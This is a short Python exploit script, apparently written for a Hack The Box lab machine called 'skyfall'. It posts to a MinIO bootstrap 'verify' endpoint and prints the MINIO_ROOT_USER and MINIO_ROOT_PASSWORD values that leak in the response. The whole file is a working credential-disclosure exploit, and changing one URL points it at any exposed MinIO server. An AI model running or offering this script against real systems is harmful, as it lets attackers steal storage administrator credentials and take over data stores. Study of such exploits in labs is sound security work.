#!/usr/bin/python3

import requests
import sys


def make_request(url: str)->None:
    generic_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                 "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Dnt": "1", 
                 "Upgrade-Insecure-Requests": "1", 
                 "Sec-Fetch-Dest": "document", 
                 "Sec-Fetch-Mode": "navigate", 
                 "Sec-Fetch-Site": "none", "Sec-Fetch-User": 
                 "?1", "Te": "trailers", 
                 "Connection": "close", 
                 "Content-Type": "application/x-www-form-urlencoded"}
    print(f"[*] Making request to {url!r}")
    r = requests.post(url, headers=generic_headers)
    if r.status_code != 200:
        print(f"[!] Invalid status code from response (HTTP code {r.status_code!r})")
        sys.exit(1)
    minio_root_user = r.json().get("MinioEnv", {}).get("MINIO_ROOT_USER")
    minio_root_password = r.json().get("MinioEnv", {}).get("MINIO_ROOT_PASSWORD")
    minio_secret_key = r.json().get("MinioEnv", {}).get("MINIO_ROOT_PASSWORD")
    print(f"[+] MINIO_ROOT_USER: {minio_root_user}")
    print(f"[+] MINIO_ROOT_PASSWORD: {minio_root_password}")
    return


def main()->None:
    url: str = "http://prd23-s3-backend.skyfall.htb:80/minio/bootstrap/v1/verify"
    make_request(url)


if __name__ == "__main__":
    main()
